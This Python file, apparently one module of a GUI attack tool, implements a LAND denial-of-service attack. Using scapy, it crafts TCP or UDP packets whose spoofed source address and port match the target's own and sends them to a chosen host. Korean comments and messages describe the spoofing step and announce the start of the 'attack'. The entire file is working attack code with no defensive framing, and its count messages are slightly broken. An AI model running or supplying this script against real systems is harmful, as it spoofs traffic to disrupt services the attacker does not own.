import socket
import sys
from scapy.all import *    #pip install scapy-python3 , pip install scapy
from scapy.layers.inet import TCP, UDP, IP
import gui


dst_ip, dst_port = 0,0
count = 0
def land_attack(ip,port,prot):
    global dst_ip, dst_port
    dst_ip = ip
    dst_port = port
    print(ip)
    try:
        global count
        count = 1
        info()
        if prot == 'tcp' or prot == 'TCP':
            lands= IP(src=ip,dst=ip)/TCP(sport=port,dport=port)  # 출발지랑 목적지 IP랑 Port 같게하기
            send(lands)  # 전송
            print("Packet sent(TCP): %d번째".format(count))
            count += 1

        elif prot == 'udp' or prot == 'UDP':
            lands= IP(src=ip,dst=ip)/UDP(sport=port,dport=port)
            send(lands)
            print("Packet sent(UDP): %d번째".format(count))
            count += 1

    except:
        print("오류가 발생했습니다.")
        pass


def info():
    print("---------------------------------------------------------------\n")
    print("Host: {0} 에서 Dest ip:{1} Dest port:{2} 로 공격을 시작합니다.\n".format(socket.gethostbyname(socket.getfqdn()),dst_ip,dst_port))
    print("---------------------------------------------------------------\n")


